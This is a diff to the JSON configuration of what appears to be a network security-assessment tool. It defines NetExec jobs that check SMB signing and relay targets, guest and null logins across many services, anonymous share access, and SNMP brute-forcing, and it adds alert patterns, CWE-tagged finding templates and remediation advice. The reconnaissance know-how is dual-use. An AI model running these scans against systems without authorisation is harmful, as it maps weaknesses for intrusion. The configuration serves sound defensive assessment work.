@@ -22,9 +22,9 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 3600,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "discovery"
             ],
@@ -44,9 +44,9 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 3600,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "discovery"
             ],
@@ -64,9 +64,9 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 3600,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "discovery",
               "smb"
@@ -85,9 +85,9 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 3600,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "discovery",
               "rdp"
@@ -106,9 +106,9 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 3600,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "discovery",
               "winrm"
@@ -127,9 +127,9 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 3600,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "discovery",
               "ssh"
@@ -148,19 +148,28 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {
               "warning": [
                 "signing:False"
               ]
             },
-            "finding_template": {},
             "tags": [
               "discovery",
               "smb",
               "relay"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "SMB Signing Not Required",
+              "severity": "medium",
+              "cwe": "CWE-326",
+              "remediation": "Enforce SMB signing via GPO ('Microsoft network server: Digitally sign communications (always)').",
+              "references": [
+                "https://learn.microsoft.com/windows/security/threat-protection/security-policy-settings/microsoft-network-server-digitally-sign-communications-always"
+              ]
+            }
           },
           {
             "name": "NXC SMB gen-relay-list (targets)",
@@ -174,19 +183,28 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {
               "warning": [
                 "signing:False"
               ]
             },
-            "finding_template": {},
             "tags": [
               "discovery",
               "smb",
               "relay"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "SMB Signing Not Required",
+              "severity": "medium",
+              "cwe": "CWE-326",
+              "remediation": "Enforce SMB signing via GPO ('Microsoft network server: Digitally sign communications (always)').",
+              "references": [
+                "https://learn.microsoft.com/windows/security/threat-protection/security-policy-settings/microsoft-network-server-digitally-sign-communications-always"
+              ]
+            }
           }
         ]
       },
@@ -207,9 +225,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 7200,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "portscan"
             ],
@@ -225,9 +243,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 3600,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "portscan"
             ],
@@ -243,9 +261,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 3600,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "portscan"
             ],
@@ -261,9 +279,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 7200,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "portscan",
               "service"
@@ -291,15 +309,25 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "smb",
               "auth",
               "guest"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Anonymous/Guest SMB Access",
+              "severity": "medium",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           },
           {
             "name": "NXC SMB Guest Auth",
@@ -309,15 +337,25 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "smb",
               "auth",
               "guest"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Anonymous/Guest SMB Access",
+              "severity": "medium",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           },
           {
             "name": "NXC SMB Null Auth (batch)",
@@ -331,15 +369,25 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "smb",
               "auth",
               "null"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Null-Session SMB Access",
+              "severity": "medium",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           },
           {
             "name": "NXC SMB Null Auth",
@@ -349,15 +397,25 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "smb",
               "auth",
               "null"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Null-Session SMB Access",
+              "severity": "medium",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           },
           {
             "name": "NXC RDP Guest Auth (batch)",
@@ -371,15 +429,25 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "rdp",
               "auth",
               "guest"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Anonymous/Guest RDP Access",
+              "severity": "high",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           },
           {
             "name": "NXC RDP Guest Auth",
@@ -389,15 +457,25 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "rdp",
               "auth",
               "guest"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Anonymous/Guest RDP Access",
+              "severity": "high",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           },
           {
             "name": "NXC RDP Null Auth (batch)",
@@ -411,15 +489,25 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "rdp",
               "auth",
               "null"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Null-Session RDP Access",
+              "severity": "high",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           },
           {
             "name": "NXC RDP Null Auth",
@@ -429,15 +517,25 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "rdp",
               "auth",
               "null"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Null-Session RDP Access",
+              "severity": "high",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           },
           {
             "name": "NXC WinRM Guest Auth (batch)",
@@ -451,15 +549,25 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "winrm",
               "auth",
               "guest"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Anonymous/Guest WinRM Access",
+              "severity": "high",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           },
           {
             "name": "NXC WinRM Guest Auth",
@@ -469,15 +577,25 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "winrm",
               "auth",
               "guest"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Anonymous/Guest WinRM Access",
+              "severity": "high",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           },
           {
             "name": "NXC WinRM Null Auth (batch)",
@@ -491,15 +609,25 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "winrm",
               "auth",
               "null"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Null-Session WinRM Access",
+              "severity": "high",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           },
           {
             "name": "NXC WinRM Null Auth",
@@ -509,15 +637,25 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "winrm",
               "auth",
               "null"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Null-Session WinRM Access",
+              "severity": "high",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           },
           {
             "name": "NXC MSSQL Guest Auth (batch)",
@@ -531,15 +669,25 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "mssql",
               "auth",
               "guest"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Anonymous/Guest MSSQL Access",
+              "severity": "high",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           },
           {
             "name": "NXC MSSQL Guest Auth",
@@ -549,15 +697,25 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "mssql",
               "auth",
               "guest"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Anonymous/Guest MSSQL Access",
+              "severity": "high",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           },
           {
             "name": "NXC MSSQL Null Auth (batch)",
@@ -571,15 +729,25 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "mssql",
               "auth",
               "null"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Null-Session MSSQL Access",
+              "severity": "high",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           },
           {
             "name": "NXC MSSQL Null Auth",
@@ -589,15 +757,25 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "mssql",
               "auth",
               "null"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Null-Session MSSQL Access",
+              "severity": "high",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           },
           {
             "name": "NXC SSH Guest Auth (batch)",
@@ -611,15 +789,25 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "ssh",
               "auth",
               "guest"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Guest SSH Access",
+              "severity": "high",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           },
           {
             "name": "NXC SSH Guest Auth",
@@ -629,15 +817,25 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "ssh",
               "auth",
               "guest"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Guest SSH Access",
+              "severity": "high",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           },
           {
             "name": "NXC SSH Null Auth (batch)",
@@ -651,15 +849,25 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "ssh",
               "auth",
               "null"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Null SSH Access",
+              "severity": "high",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           },
           {
             "name": "NXC SSH Null Auth",
@@ -669,15 +877,25 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "ssh",
               "auth",
               "null"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Null SSH Access",
+              "severity": "high",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           },
           {
             "name": "NXC FTP Guest Auth (batch)",
@@ -691,15 +909,25 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "ftp",
               "auth",
               "guest"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Anonymous FTP Access",
+              "severity": "medium",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           },
           {
             "name": "NXC FTP Guest Auth",
@@ -709,15 +937,25 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "ftp",
               "auth",
               "guest"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Anonymous FTP Access",
+              "severity": "medium",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           },
           {
             "name": "NXC FTP Null Auth (batch)",
@@ -731,15 +969,25 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "ftp",
               "auth",
               "null"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Null FTP Access",
+              "severity": "medium",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           },
           {
             "name": "NXC FTP Null Auth",
@@ -749,15 +997,25 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "ftp",
               "auth",
               "null"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Null FTP Access",
+              "severity": "medium",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           },
           {
             "name": "NXC WMI Guest Auth (batch)",
@@ -771,15 +1029,25 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "wmi",
               "auth",
               "guest"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Anonymous/Guest WMI Access",
+              "severity": "high",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           },
           {
             "name": "NXC WMI Guest Auth",
@@ -789,15 +1057,25 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "wmi",
               "auth",
               "guest"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Anonymous/Guest WMI Access",
+              "severity": "high",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           },
           {
             "name": "NXC WMI Null Auth (batch)",
@@ -811,15 +1089,25 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "wmi",
               "auth",
               "null"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Null-Session WMI Access",
+              "severity": "high",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           },
           {
             "name": "NXC WMI Null Auth",
@@ -829,15 +1117,25 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]"
+              ]
+            },
             "tags": [
               "wmi",
               "auth",
               "null"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Null-Session WMI Access",
+              "severity": "high",
+              "cwe": "CWE-287",
+              "remediation": "Disable anonymous/guest authentication for this service; set RestrictAnonymous/RestrictNullSessAccess."
+            }
           }
         ]
       },
@@ -860,15 +1158,30 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]",
+                "READ"
+              ],
+              "high": [
+                "READ,WRITE",
+                "WRITE"
+              ]
+            },
             "tags": [
               "smb",
               "shares",
               "guest"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Anonymous/Guest SMB Share Access",
+              "severity": "medium",
+              "cwe": "CWE-284",
+              "remediation": "Remove anonymous/guest access to SMB shares; apply least-privilege ACLs."
+            }
           },
           {
             "name": "NXC SMB Guest Shares",
@@ -878,15 +1191,30 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]",
+                "READ"
+              ],
+              "high": [
+                "READ,WRITE",
+                "WRITE"
+              ]
+            },
             "tags": [
               "smb",
               "shares",
               "guest"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Anonymous/Guest SMB Share Access",
+              "severity": "medium",
+              "cwe": "CWE-284",
+              "remediation": "Remove anonymous/guest access to SMB shares; apply least-privilege ACLs."
+            }
           },
           {
             "name": "NXC SMB Null Shares (batch)",
@@ -900,15 +1228,30 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]",
+                "READ"
+              ],
+              "high": [
+                "READ,WRITE",
+                "WRITE"
+              ]
+            },
             "tags": [
               "smb",
               "shares",
               "null"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Anonymous/Guest SMB Share Access",
+              "severity": "medium",
+              "cwe": "CWE-284",
+              "remediation": "Remove anonymous/guest access to SMB shares; apply least-privilege ACLs."
+            }
           },
           {
             "name": "NXC SMB Null Shares",
@@ -918,15 +1261,30 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]",
+                "READ"
+              ],
+              "high": [
+                "READ,WRITE",
+                "WRITE"
+              ]
+            },
             "tags": [
               "smb",
               "shares",
               "null"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Anonymous/Guest SMB Share Access",
+              "severity": "medium",
+              "cwe": "CWE-284",
+              "remediation": "Remove anonymous/guest access to SMB shares; apply least-privilege ACLs."
+            }
           },
           {
             "name": "NXC FTP Guest List (batch)",
@@ -940,15 +1298,30 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]",
+                "READ"
+              ],
+              "high": [
+                "READ,WRITE",
+                "WRITE"
+              ]
+            },
             "tags": [
               "ftp",
               "shares",
               "guest"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Anonymous/Guest FTP Share Access",
+              "severity": "medium",
+              "cwe": "CWE-284",
+              "remediation": "Remove anonymous/guest access to FTP shares; apply least-privilege ACLs."
+            }
           },
           {
             "name": "NXC FTP Guest List",
@@ -958,15 +1331,30 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]",
+                "READ"
+              ],
+              "high": [
+                "READ,WRITE",
+                "WRITE"
+              ]
+            },
             "tags": [
               "ftp",
               "shares",
               "guest"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Anonymous/Guest FTP Share Access",
+              "severity": "medium",
+              "cwe": "CWE-284",
+              "remediation": "Remove anonymous/guest access to FTP shares; apply least-privilege ACLs."
+            }
           },
           {
             "name": "NXC FTP Null List (batch)",
@@ -980,15 +1368,30 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]",
+                "READ"
+              ],
+              "high": [
+                "READ,WRITE",
+                "WRITE"
+              ]
+            },
             "tags": [
               "ftp",
               "shares",
               "null"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Anonymous/Guest FTP Share Access",
+              "severity": "medium",
+              "cwe": "CWE-284",
+              "remediation": "Remove anonymous/guest access to FTP shares; apply least-privilege ACLs."
+            }
           },
           {
             "name": "NXC FTP Null List",
@@ -998,15 +1401,30 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]",
+                "READ"
+              ],
+              "high": [
+                "READ,WRITE",
+                "WRITE"
+              ]
+            },
             "tags": [
               "ftp",
               "shares",
               "null"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Anonymous/Guest FTP Share Access",
+              "severity": "medium",
+              "cwe": "CWE-284",
+              "remediation": "Remove anonymous/guest access to FTP shares; apply least-privilege ACLs."
+            }
           },
           {
             "name": "NXC NFS Guest Shares (batch)",
@@ -1020,15 +1438,30 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]",
+                "READ"
+              ],
+              "high": [
+                "READ,WRITE",
+                "WRITE"
+              ]
+            },
             "tags": [
               "nfs",
               "shares",
               "guest"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Anonymous/Guest NFS Share Access",
+              "severity": "medium",
+              "cwe": "CWE-284",
+              "remediation": "Remove anonymous/guest access to NFS shares; apply least-privilege ACLs."
+            }
           },
           {
             "name": "NXC NFS Guest Shares",
@@ -1038,15 +1471,30 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]",
+                "READ"
+              ],
+              "high": [
+                "READ,WRITE",
+                "WRITE"
+              ]
+            },
             "tags": [
               "nfs",
               "shares",
               "guest"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Anonymous/Guest NFS Share Access",
+              "severity": "medium",
+              "cwe": "CWE-284",
+              "remediation": "Remove anonymous/guest access to NFS shares; apply least-privilege ACLs."
+            }
           },
           {
             "name": "NXC NFS Null Shares (batch)",
@@ -1060,15 +1508,30 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]",
+                "READ"
+              ],
+              "high": [
+                "READ,WRITE",
+                "WRITE"
+              ]
+            },
             "tags": [
               "nfs",
               "shares",
               "null"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Anonymous/Guest NFS Share Access",
+              "severity": "medium",
+              "cwe": "CWE-284",
+              "remediation": "Remove anonymous/guest access to NFS shares; apply least-privilege ACLs."
+            }
           },
           {
             "name": "NXC NFS Null Shares",
@@ -1078,15 +1541,30 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
-            "alert_patterns": {},
-            "finding_template": {},
+            "alert_patterns": {
+              "warning": [
+                "\\[\\+\\]",
+                "READ"
+              ],
+              "high": [
+                "READ,WRITE",
+                "WRITE"
+              ]
+            },
             "tags": [
               "nfs",
               "shares",
               "null"
             ],
-            "enabled": true
+            "enabled": true,
+            "finding_template": {
+              "title": "Anonymous/Guest NFS Share Access",
+              "severity": "medium",
+              "cwe": "CWE-284",
+              "remediation": "Remove anonymous/guest access to NFS shares; apply least-privilege ACLs."
+            }
           }
         ]
       },
@@ -1109,9 +1587,9 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 3600,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "snmp",
               "discovery"
@@ -1130,9 +1608,9 @@
                 "type": "file"
               }
             },
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "snmp",
               "brute"
@@ -1147,9 +1625,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 600,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "snmp",
               "enum"
@@ -1164,9 +1642,9 @@
             "input_definitions": {},
             "storage_policy": {},
             "parameter_schema": {},
+            "target_filter": {},
             "timeout": 300,
             "alert_patterns": {},
-            "finding_template": {},
             "tags": [
               "snmp",
               "enum"
@@ -1179,7 +1657,7 @@
